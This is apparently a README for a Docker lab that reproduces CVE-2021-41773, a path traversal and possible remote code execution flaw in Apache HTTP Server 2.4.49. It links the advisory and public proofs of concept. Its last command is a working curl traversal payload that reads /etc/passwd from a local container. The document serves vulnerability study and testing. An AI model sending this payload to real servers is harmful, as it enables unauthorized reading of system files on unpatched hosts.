# Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 (CVE-2021-41773)

[中文版本 (Chinese Version)](README.zh-cn.md)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

A flaw was discovered in the path normalization logic of Apache HTTP Server 2.4.49.  
An attacker could exploit this vulnerability to perform a path traversal attack and map URLs to files outside the expected document root.

If the files outside these directories are not protected by the default configuration (`Require all denied`), attackers can successfully access them.  
Moreover, if CGI scripts are enabled for the aliased paths, it could further lead to **remote code execution (RCE)**.

## References
- [Apache HTTP Server Security Advisory](https://httpd.apache.org/security/vulnerabilities_24.html)
- [PoC by ptswarm (Twitter)](https://twitter.com/ptswarm/status/1445376079548624899)
- [PoC by HackerGautam (Twitter)](https://twitter.com/HackerGautam/status/1445412108863041544)
- [PoC by snyff (Twitter)](https://twitter.com/snyff/status/1445565903161102344)

---

## Vulnerable Environment

Build and run the vulnerable Apache HTTP Server environment using the following commands:

```bash
docker build -t apache-cve-2021-41773 .
```
![](1.png)

```bash
docker run -d -p 8080:80 --name apache-41773 apache-cve-2021-41773
```
![](2.png)

```bash
curl -v http://127.0.0.1:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
![](3.png)
